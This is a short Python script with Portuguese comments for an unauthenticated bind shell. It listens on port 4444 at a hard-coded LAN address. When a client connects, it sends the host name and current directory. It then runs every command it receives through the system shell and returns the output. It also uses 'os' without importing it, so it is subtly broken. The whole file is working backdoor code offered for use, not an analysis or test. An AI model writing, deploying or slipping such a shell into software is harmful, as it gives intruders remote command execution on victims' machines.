import socket
import subprocess
import platform

class RemoteShell:
    def __init__(self, port=4444):
        self.PORT = port

    def execute_command(self, command):
        """Executa um comando no sistema e retorna a saída."""
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
            return output.decode()
        except subprocess.CalledProcessError as e:
            return str(e)
        except Exception as e:
            return str(e)

    def get_system_info(self):
        """Retorna informações do sistema."""
        try:
            system_info = f"System: {platform.system()} {platform.release()}\n"
            system_info += f"Node Name: {platform.node()}\n"
            system_info += f"Processor: {platform.processor()}\n"
            system_info += f"Machine: {platform.machine()}\n"
            system_info += f"Python Version: {platform.python_version()}\n"
            return system_info
        except Exception as e:
            return str(e)

    def main(self):
        """Conecta ao host e aguarda comandos."""
        print("Conectando ao host...")
        # Substitua pelo IP local da sua máquina (ex: 192.168.1.100)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('192.168.1.100', self.PORT))  # Usando o IP local
        server.listen(1)
        print("Aguardando conexão na IP 192.168.1.100...")
        connection, address = server.accept()
        print(f"Conexão recebida de {address}")

        with connection:
            # Envia informações do sistema
            connection.send("Conectado ao servidor remoto.\n".encode())
            connection.send(f"Nome da máquina: {platform.node()}\n".encode())
            connection.send(f"Diretório atual: {os.getcwd()}\n".encode())

            while True:
                # Aguarda um comando para executar
                command = connection.recv(1024).decode()
                if command.strip().lower() == 'exit':
                    break
                elif command.strip().lower() == 'system_info':
                    system_info = self.get_system_info()
                    connection.send(system_info.encode())
                else:
                    output = self.execute_command(command)
                    connection.send(output.encode())

if __name__ == "__main__":
    remote_shell = RemoteShell()
    remote_shell.main()

